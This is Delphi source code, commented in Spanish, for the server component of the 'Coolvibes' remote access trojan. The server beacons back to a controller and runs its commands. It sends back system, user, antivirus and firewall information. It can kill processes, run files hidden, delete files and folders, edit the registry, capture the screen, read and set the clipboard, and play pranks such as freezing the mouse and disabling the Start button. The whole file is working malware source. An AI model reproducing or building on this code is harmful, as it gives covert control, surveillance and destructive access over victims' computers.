{Unit principal del Server del troyano Coolvibes}
program CoolServer;

uses
  Windows,
  ScktComp,
  Classes,
  UnitFunciones,
  UnitSystemInfo,
  UnitProcess,
  UnitWindows,
  UnitBromas,
  UnitFileManager,
  UnitVariables,
  UnitRegistro,
  unitCapScreen,
  unitAvs;

const FO_RENAME = $0004;
const FOF_SILENT = $0004;
const FOF_NOCONFIRMATION = $0010;
const FOF_ALLOWUNDO = $0040;
const FOF_FILESONLY = $0080;

type
  TClientStatus = (CSIdle, CSReceivingFile); //Para determinar el estado de la captura de pantalla
  TClassClientSocket = class
    ClientSocket: TClientSocket;
    procedure ClientSocketRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure ClientSocketError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
end;

type SHFILEOPSTRUCT = record
     HWND: Cardinal;
     wFunc: Cardinal;
     pFrom: PAnsiChar;
     pTo: PAnsiChar;
     fFlags: Word;
     fAnyOperationsAborted: LongBool;
     hNameMappings: Pointer;
     lpszProgressTitle: PAnsiChar;
end;

var
  Cliente: TClassClientSocket;
  Msg: TMsg;
  PSE: PSecurityAttributes;

function ShellExecute(HWND:Cardinal;lpOperation: PAnsiChar; lpFile: PAnsiChar; lpParameters: PAnsiChar; lpDirectory: PAnsiChar; nShowcmd: Integer): Cardinal; stdcall; external 'shell32' name 'ShellExecuteA';
function FileExists(lpzFile: PAnsiChar): Boolean; stdcall; external 'shlwapi.dll' name'PathFileExistsA';
function DirectoryExists(lpzDirectory: PAnsiChar): Boolean; stdcall; external 'shlwapi.dll' name 'PathIsDirectoryA';
function CreateDir(lpPathName: PAnsiChar; lpSecurityAttributes: PSECURITYATTRIBUTES): Boolean; stdcall; external 'kernel32' name 'CreateDirectoryA';
function SHFileOperation(const lpFileOp: SHFILEOPSTRUCT): Integer; stdcall; external 'shell32' name 'SHFileOperationA';
function mciSendString(lpszCommand: PAnsiChar; lpszReturnString: PAnsiChar; cchReturn: Integer; hwndCallback: Cardinal): Cardinal; stdcall; external 'Winmm' name 'mciSendStringA';

function RenameFile(lpzPathOrFile: String; NewName: String): Boolean;
var
SHF: SHFILEOPSTRUCT;
begin
     SHF.hWnd:= 0;
     SHF.wFunc:= FO_RENAME;
     SHF.fFlags:= FOF_FILESONLY or FOF_ALLOWUNDO or FOF_SILENT or FOF_NOCONFIRMATION;
     SHF.pFrom:= PChar(lpzPathOrFile + chr(0));
     SHF.pTo:=  PChar(NewName + chr(0));
     Result:= (0 = SHFileOperation(SHF));
end;


function IntToStr(Num: Integer):String;
var x:string;
begin
     System.Str(Num,x);
     result:=x;
end;

function StrToInt(cadena : string) : int64;
var
i : integer;
begin
        result:=0;
        for i:=1 to length(cadena) do
        if cadena[i] in ['0'..'9'] then result:=result*10+ord(cadena[i])-48;
end;

function GetLastSlash(lpzString: String): Integer;
var
i: Integer;
begin
     If Length(lpzString) > 0 Then
     begin
          for i := Length(lpzString) downto 1 do
          begin
               If lpzString[i] = '\' Then
               begin
                    Result:= i ;
                    Break;
               end;
          end;
     end else
     begin
          Result:= 0;
     end;
end;

function sMid(lpStr:String;nIndex:Integer;nLength:Integer):String;
var
i:Integer;
begin;
If Length(lpStr) > 0 Then
begin
     for i := nIndex to (nLength + nIndex)-1 do
     begin
          If i = Length(lpStr) then    //Entonces los strings de delphi son de los buenos xD
          begin
               Result := Result + lpStr[i];
               break;
          end else
          begin
               Result := Result + lpStr[i]
          end;
     end;
end;
end;

function ExtractFilePath(lpzPath: String) : String;
begin
     If GetLastSlash(lpzPath) > 0 Then
     begin
          Result:= Copy(lpzPath,1, GetLastSlash(lpzPath));
     end;
end;

procedure CrearServer();
begin                                                                                                                         
  //Aquí irá la carga de opciones del editor. Inicializamos las variables configurables del troyano.
  IP := '127.0.0.1';
  Puerto := 81;
  Nombre := 'CoolTest';  //Nombre que identifica al servidor
  Version := '0.2';
  TimeToNotify := 10; //En segundos cada cuanto intenta conectarse el server al cliente
  //Fin de carga de configuración

  Cliente := TClassClientSocket.Create;
  Cliente.ClientSocket := TClientSocket.Create(nil);
  Cliente.ClientSocket.Host := IP;
  Cliente.ClientSocket.Port := Puerto;
  Cliente.ClientSocket.OnRead := Cliente.ClientSocketRead;
  Cliente.ClientSocket.OnError := Cliente.ClientSocketError;
end;

procedure Conectar();
begin
  if not Cliente.ClientSocket.Active then
    try
      Cliente.ClientSocket.Open;
    except
    end;
end;

procedure TClassClientSocket.ClientSocketError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  ErrorCode := 0;
end;

procedure TClassClientSocket.ClientSocketRead(Sender: TObject;
      Socket: TCustomWinSocket);
var
  Recibido: String;
  Respuesta: String;
  TempStr, TempStr1, TempStr2 ,TempStr3: String;
  TheFileSize: integer;
  FS : TFileStream;
  Tipo, BotonPulsado : integer;
begin
  Recibido := Socket.ReceiveText;

  if Recibido = 'PING' then  //Respuesta a pings
  begin
    Socket.SendText('PONG');
    exit;
  end;

  //Información mostrada en el ListView de conexiones del cliente
  if Recibido = 'MAININFO' then
  begin
    Respuesta := Socket.LocalAddress + '|' +  //IP privada
                 Nombre + '|' +
                 GetCPU() + '|' +
                 GetOS() + '|' +
                 Version + '|';
    Socket.SendText('MAININFO|' + Respuesta);
  end;

  //Información mas extendida del sistema
  if Recibido = 'INFO' then
  begin
    Respuesta := GetOS() + '|' +
                 GetCPU() + '|' +
                 fGetComputerName + '|'+
                 fGetUserName + '|' +
                 ObtenerAvs + '|' +
                 obtenerFirewall + '|' +
                 GetSvrPath + '|';

    Socket.SendText('INFO|' + Respuesta);
  end;

  //Comandos relaccionados con los procesos
  if Recibido='PROC' then
  begin
    Respuesta:=GetProc()+'|';
    Socket.SendText('PROC|'+Respuesta);
  end;

  {Si los primeros ocho caracteres son 'KILLPROC', significa que hay que matar
  un proceso. Saca el PID y mata ese proceso. Sintaxis del comando: KILLPROC|<PID>}
  if Copy(Recibido, 1,8) = 'KILLPROC' then
  begin
    Delete(Recibido, 1, 9);
    if TerminarProceso(Recibido) = True then
      Socket.SendText('MSG|Proceso matado con PID ' + Recibido)
    else
      Socket.SendText('MSG| :( No pude matar el proceso con PID ' + Recibido);
  end;
  //Fin de comandos relaccionados con los procesos

  //Comandos relaccionados con las ventanas
  if Recibido='WIND' then
  begin
    Respuesta:=GetWins()+'|';
    Socket.SendText('WIND|'+Respuesta);
  end;

  if Copy(Recibido, 1,8) = 'CLOSEWIN' then
  begin
    Delete(Recibido, 1, 9);
    CerrarVentana(StrToInt(Recibido));
    Socket.SendText('MSG|Ventana cerrada con Handle ' + Recibido);
  end;

  if Copy(Recibido, 1,6) = 'MAXWIN' then
  begin
    Delete(Recibido, 1, 7);
    MaximizarVentana(StrToInt(Recibido));
    Socket.SendText('MSG|Ventana maximizada con Handle ' + Recibido);
  end;

  if Copy(Recibido, 1,6) = 'MINWIN' then
  begin
    Delete(Recibido, 1, 7);
    MinimizarVentana(StrToInt(Recibido));
    Socket.SendText('MSG|Ventana minimizada con Handle ' + Recibido);
  end;

  if Copy(Recibido, 1,7) = 'SHOWWIN' then
  begin
    Delete(Recibido, 1, 8);
    MostrarVentana(StrToInt(Recibido));
    Socket.SendText('MSG|Ventana mostrada con Handle ' + Recibido);
  end;

  if Copy(Recibido, 1,7) = 'HIDEWIN' then
  begin
    Delete(Recibido, 1, 8);
    OcultarVentana(StrToInt(Recibido));
    Socket.SendText('MSG|Ventana ocultada con Handle ' + Recibido);
  end;

  if Recibido = 'MINALLWIN' then
  begin
    MinimizarTodas();
    Socket.SendText('MSG|Minimizadas todas las ventanas.');
  end;

  if Copy(Recibido, 1, 11) = 'BOTONCERRAR' then
  begin
    Delete(Recibido, 1, 12);
    if Copy(Recibido, 1, 2) = 'SI' then
    begin
      Delete(Recibido, 1, 3); //Borra 'SI|' y queda el handle
      BotonCerrar(True, StrToInt(Recibido));
      Socket.SendText('MSG|Se activó el botón Cerrar [X] en la ventana con Handle ' + Recibido);
    end
    else
    begin
      Delete(Recibido, 1, 3); //Borra 'NO|' y queda el handle
      BotonCerrar(False, StrToInt(Recibido));
      Socket.SendText('MSG|Se desactivó el botón Cerrar [X] en la ventana con Handle ' + Recibido);
    end;
  end;
  //Fin de comandos relacionados con las ventanas

  //Comandos relaccionados con las bromas
  if Copy(Recibido, 1, 15) = 'MOUSETEMBLOROSO' then
  begin
    Delete(Recibido, 1, 16); //Borra 'MOUSETEMBLOROSO|' de la cadena
    if Recibido  = 'Activar' then
    begin
      //activar mouse tembloroso
      CongelarMouse(False); //Lo descongela si está congelado
      TemblarMouse(True);
      Socket.SendText('MOUSETEMBLOROSO|Activado');
    end
    else
    begin
      //desactivar mouse tembloroso
      TemblarMouse(False);
      Socket.SendText('MOUSETEMBLOROSO|Desactivado');
    end;
  end;

  if Copy(Recibido, 1, 13) = 'CONGELARMOUSE' then
  begin
    Delete(Recibido, 1, 14); //Borra 'CONGELARMOUSE|' de la cadena
    if Recibido  = 'Activar' then
    begin
      //activar congelar mouse
      TemblarMouse(False); //El mouse para de temblar si se congela
      CongelarMouse(True);
      Socket.SendText('CONGELARMOUSE|Activado');
    end
    else
    begin
      //desactivar congelar mouse
      CongelarMouse(False);
      Socket.SendText('CONGELARMOUSE|Desactivado');
    end;
  end;

  if Copy(Recibido, 1, 7) = 'ABRIRCD' then
  begin
    Delete(Recibido, 1, 8); //Borra 'ABRIRCD|' de la cadena
    if Recibido  = 'Activar' then
    begin
      //abrir cd
      mciSendString( 'Set cdaudio door open wait', nil, 0, hInstance);
      Socket.SendText('ABRIRCD|Activado');
    end
    else
    begin
      //cerrar cd
      mciSendString( 'Set cdaudio door closed wait' , nil , 0 , hInstance );
      Socket.SendText('ABRIRCD|Desactivado');
    end;
  end;

  if Copy(Recibido, 1, 16) = 'MATARBOTONINICIO' then
  begin
    Delete(Recibido, 1, 17); //Borra 'MATARBOTONINICIO|' de la cadena
    if Recibido  = 'Activar' then
    begin
      //Desactivar boton inicio
      EnableWindow( FindWindowEx( FindWindow( 'Shell_TrayWnd', nil ) , 0 , 'Button', nil ) , False );
      Socket.SendText('MATARBOTONINICIO|Activado');
    end
    else
    begin
      //Activar boton inicio
      EnableWindow( FindWindowEx( FindWindow( 'Shell_TrayWnd', nil ) , 0 , 'Button', nil ) , True );
      Socket.SendText('MATARBOTONINICIO|Desactivado');
    end;
  end;
  //Fin de comandos relaccionados con las bromas

  //Comandos relaccionados con los mensajes
  if Copy(Recibido, 1, 4) = 'MSJN' then
  begin
    Delete(Recibido, 1, 4);
    TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Obtenemos el mensaje
    Delete(Recibido, 1, Pos('|', Recibido));
    TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Obtenemos el titulo
    Delete(Recibido, 1, Pos('|', Recibido));
    TempStr2 := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Tipo de mensaje
    Delete(Recibido, 1, pos('|', Recibido));
    TempStr3 := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Obtenemos los botones del mensaje

    Tipo := 0;
    //Miramos el tipo de mensaje
    if TempStr2 = 'warn' then
      Tipo := MB_ICONERROR;
    if TempStr2 = 'ques' then
      Tipo := MB_ICONQUESTION;
    if TempStr2 = 'excl' then
      Tipo := MB_ICONEXCLAMATION;
    if TempStr2 = 'info' then
      Tipo := MB_ICONINFORMATION;

    case StrToInt(TempStr3) of //Lo transformamos en entero para poder usar el case
      0: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1), Tipo + MB_OK);
      1: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1), Tipo + MB_OKCANCEL);
      2: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1), Tipo + MB_RETRYCANCEl);
      3: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1), Tipo + MB_YESNO);
      4: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1), Tipo + MB_YESNOCANCEL);
      5: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1), Tipo + MB_ABORTRETRYIGNORE);
    end;
    case BotonPulsado of
      IdOK    : Socket.SendText('MSG|El usuario respondió: OK');
      IdCancel: Socket.SendText('MSG|El usuario respondió: Cancelar');
      IdRetry : Socket.SendText('MSG|El usuario respondió: Reintentar');
      IdYes   : Socket.SendText('MSG|El usuario respondió: Sí');
      IdNo    : Socket.SendText('MSG|El usuario respondió: No');
      IdAbort : Socket.SendText('MSG|El usuario respondió: Anular');
      IdIgnore: Socket.SendText('MSG|El usuario respondió: Omitir');
    end;
  end;
  //Fin de comandos relacionados con los Mensajes

  //Comandos relacionados con el FileManager
  if Recibido = 'VERUNIDADES' then
    Socket.SendText('VERUNIDADES|' + GetDrives);

  if Copy(Recibido, 1, 14) = 'LISTARARCHIVOS' then
  begin
    Delete(Recibido, 1, 15);
    if Copy(GetDirectory(Recibido), 1, 4) = 'MSG|' then
    begin
      //Diga que no existe el directorio asignado y salte...
      Socket.SendText(GetDirectory(Recibido));
      exit;
    end;
    Socket.SendText('LISTARARCHIVOS|'+GetDirectory(Recibido));
  end;
  //Ejecutar Archivo...
  if Copy(Recibido, 1, 4) = 'EXEC' then
  begin
    Delete(Recibido, 1, 5); //Borra 'EXEC|'
    if Copy(Recibido, 1, 6) = 'NORMAL' then
    begin
      Delete(Recibido, 1, 7); //Borra 'NORMAL|'
      //Ejecutar en modo normal el archivo que queda en Recibido
      //If the function ShellExecute fails, the return value is an error value that is less than or equal to 32
      if ShellExecute(0, 'open', PChar(Recibido), ''{sin parametros}, PChar(ExtractFilePath(Recibido)), SW_NoRMAL) > 32 then
        Socket.SendText('MSG|Archivo correctamente ejecutado :).')
      else
        Socket.SendText('MSG|Se produjo algún error al ejecutar el archivo.');
    end; //if copy = normal
    if Copy(Recibido, 1, 6) = 'OCULTO' then
    begin
      Delete(Recibido, 1, 7);//Borra 'OCULTO|'
      //Ejecutar en modo oculto el archivo que queda en Recibido
      //If the function ShellExecute fails, the return value is an error value that is less than or equal to 32
      if ShellExecute(0, 'open', PChar(Recibido), ''{sin parametros}, PChar(ExtractFilePath(Recibido)), SW_HIDE) > 32 then
        Socket.SendText('MSG|Archivo correctamente ejecutado de manera oculta :).')
      else
        Socket.SendText('MSG|Se produjo algún error al ejecutar el archivo de manera oculta.');
    end; //if copy = oculto
  end; //if copy = exec

  //Borrar archivo
  if Copy(Recibido, 1, 7) = 'DELFILE' then
  begin
    Delete(Recibido, 1, 8);//Borra 'DELFILE|'
    if FileExists(PChar(Recibido)) then
    begin
      if BorrarArchivo(Recibido) = true then
        Socket.SendText('MSG|El archivo fue borrado con éxito.')
      else
        Socket.SendText('MSG|El archivo no se pudo borrar.');
    end
    else //el archivo no existe.... Se supone que nunca o muy pocas veces debería pasar.
      Socket.SendText('MSG|El archivo no existe. Tal vez ya fue borrado.');
  end;

  //Borrar carpeta
  if Copy(Recibido, 1, 9) = 'DELFOLDER' then
  begin
    Delete(Recibido, 1, 10);
    if DirectoryExists(PChar(Recibido)) then
    begin
      if BorrarCarpeta(Recibido) = true then
        Socket.SendText('MSG|La carpeta fue borrada con éxito.')
      else
        Socket.SendText('MSG|No se pudo borrar la carpeta.');
    end
    else
      Socket.SendText('MSG|La carpeta no existe. Tal vez ya fue borrada.');
  end;

  //Renombrar archivos o carpetas
  if Copy(Recibido, 1, 6) = 'RENAME' then
  begin
    Delete(Recibido, 1, 7);
    TempStr := Copy(Recibido, 1, Pos('|', Recibido) -1); //Saca el nombre viejo
    Delete(Recibido, 1, Pos('|', Recibido)); //borra lo que acaba de copiar
    if FileExists(PChar(TempStr)) or DirectoryExists(PChar(TempStr)) then
    begin
      if RenameFile(TempStr, Recibido) = True then
      begin
         Socket.SendText('MSG|Archivo o carpeta renombrada con éxito.')
      end else
      begin
        Socket.SendText('MSG|No se pudo renombrar el archivo o la carpeta.');
    end;
    end   else
      Socket.SendText('MSG|El archivo o la carpeta no existe.');//el archivo no existe...
  end;

  //Crear carpeta
  if Copy(Recibido, 1, 5) = 'MKDIR' then
  begin
    Delete(Recibido, 1, 6);
    if not DirectoryExists(PChar(Recibido)) then
    begin
      if CreateDir(PChar(Recibido),PSE) = True then
        Socket.SendText('MSG|Carpeta creada con éxito.')
      else
        Socket.SendText('MSG|No se pudo crear la carpeta.');
    end
    else
      Socket.SendText('MSG|La carpeta ya existe, no es necesario crearla.'); //Ya existe una carpeta con ese nombre
  end;
  //Fin de comandos relacionados con el FileManager

  //Comandos relacionados con el Registro
  if Copy(Recibido, 1, 12) = 'LISTARCLAVES' then
  begin
    Delete(Recibido, 1, 13);
    Socket.SendText('LISTARCLAVES|' + ListarClaves(Recibido));
  end;

  if Copy(Recibido, 1, 13) = 'LISTARVALORES' then
  begin
    Delete(Recibido, 1, 14);
    Socket.SendText('LISTARVALORES|' + ListarValores(Recibido));
  end;

  if Copy(Recibido, 1, 14) = 'NEWNOMBREVALOR' then
  begin
    Delete(Recibido, 1, 15);
    //Extraemos la clave donde está el valor
    TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
    Delete(Recibido, 1, Pos('|', Recibido));
    //Obtenemos el viejo nombre del valor
    TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1);
    Delete(Recibido, 1, Pos('|', Recibido));
    //Conseguimos el nuevo nombre del valor
    TempStr2 := Copy(Recibido, 1, Length(Recibido));
    if RenombrarClave(PChar(TempStr), PChar(TempStr1), PChar(TempStr2)) then
      Socket.SendText('MSG|Modificado nombre de clave con éxito.')
    else
      Socket.SendText('MSG|Error al modificar el nombre de la clave.');
  end;

  if Copy(Recibido, 1, 14) = 'BORRARREGISTRO' then
  begin
    Delete(Recibido, 1, 15);
    if BorraClave(Recibido) then
      Socket.SendText('MSG|Clave o Valor eliminado con éxito.')
    else
      Socket.SendText('MSG|No se pudo eliminar la clave o el valor.');
  end;

  if Copy(Recibido, 1, 8) = 'NEWCLAVE' then
  begin
    Delete(Recibido, 1, 9);
    TempStr :=  Copy(Recibido, 1, Pos('|', Recibido) - 1);
    Delete(Recibido, 1, Pos('|', Recibido));
    TempStr1 := Copy(Recibido, 1, Length(Recibido));  //Quitamos la última barra '\'
    if AniadirClave(TempStr + TempStr1, '', 'clave') then
      Socket.SendText('MSG|Clave añadida con éxito.')
    else
      Socket.SendText('MSG|No se pudo añadir la clave.');
  end;

  if Copy(Recibido, 1, 8) = 'ADDVALUE' then
  begin
    Delete(Recibido, 1, 9);
    TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
    Delete(Recibido, 1, Pos('|', Recibido));
    TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1);
    Delete(Recibido, 1, Pos('|', Recibido));
    if AniadirClave(TempStr, Copy(Recibido, 1, Length(Recibido)), TempStr1) then
      Socket.SendText('MSG|Valor añadido con éxito.')
    else
      Socket.SendText('MSG|No se pudo añadir el valor.');
  end;
  //Fin de comandos relacionados con el Registro

  //Codigo para capturar la pantalla
  if Copy(Recibido, 1, 9) = 'CAPSCREEN' then
  begin
    Delete(Recibido, 1, 9);
    CapturarPantalla(StrToInt(Recibido)); //Capturamos pantalla con compresion recibida
    

    FS := TFileStream.Create(ExtractFilePath(ParamStr(0)) + 'jpgcool.cap', 0);
    FS.Position := 0;
    TheFileSize := FS.Size;
    Socket.SendText ('<FILEONWAY>' + IntToStr(TheFileSize) + '|');
    Socket.SendStream(FS);
    FS.Free;
  end;

  if Copy(Recibido,1,12) = 'GETCLIPBOARD' Then
  begin
       Delete(Recibido,1,12);
       Socket.SendText('GETCLIPBOARD|' + GetClipBoardDatas)
  end;

  if copy(Recibido,1,12) = 'SETCLIPBOARD' Then
  begin
       Delete(Recibido,1,13);
       SetClipBoardDatas(PChar(Recibido));
  end;

  //Fin del código para capturar pantalla
end;//Fin del OnRead del socket

//Inicio del programa
begin
  CrearServer();
  Conectar();
  SetTimer(0, 0, TimeToNotify*1000, @Conectar);
  //Bucle que mantendrá el programa vivo
  while True do
  begin
    Sleep(10);
    if PeekMessage(Msg, 0, 0, 0, PM_REMOVE) then
    begin
      if Msg.Message <> $0012 then
      begin
        TranslateMessage(Msg);
        DispatchMessage(Msg);
      end
      else
        //Si deseamos hacer algo al salir ponerlo aquí
        Break;
    end;
  end;

end.

